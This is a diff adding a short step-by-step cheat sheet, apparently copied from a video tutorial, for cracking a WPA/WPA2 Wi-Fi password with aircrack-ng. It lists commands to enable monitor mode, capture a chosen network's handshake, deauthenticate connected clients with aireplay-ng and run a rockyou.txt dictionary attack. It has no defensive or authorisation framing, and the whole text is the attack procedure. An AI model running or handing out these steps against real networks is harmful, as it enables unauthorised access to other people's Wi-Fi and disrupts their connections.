@@ -1,0 +1,29 @@
+Locate rockyou.txt
+(Extract from /usr/share/wordlists/rockyou.txt.gz)
+
+airmon-ng check kill
+(Kills processes that could interrupt the process) [Will disconnect from WiFi]
+
+airmon-ng 
+(shows interface)
+
+airmon-ng start [interface goes here](ex: wlan0)
+(Starts the chip in monitor mode & gives new interface)
+
+airodump-ng [new interface goes here](ex: wlan0mon)
+(Hit enter to start the search for nearby wifi connections)
+[Ctrl + C]
+
+airodump-ng -c [channel num goes here](ex: 1) --write [location for files to save](ex: /root/Desktop/hack) --bssid [bssid goes here] [interface goes here](ex: wlan0mon)
+{Open in new terminal}
+
+aireplay-ng --deauth 5 -a (station goes here)  [interface goes here](ex: wlan0mon)
+{If "waiting for beacon frame" error appears, use bssid over station}
+
+aircrack-ng -a2 -b [bssid or station you used] -w [location for saving](ex: /root/Desktop/rockyou.txt) [location for saved capture file](ex: /root/Desktop/hack-01.cap)
+{Will start cracking password}
+
+
+
+Info gained from: https://www.youtube.com/watch?v=JEQHYib97FY&t=513s&index=2&list=PL5HgmYMcFMsUaZGILtWraj-0AbApmx7vZ
+
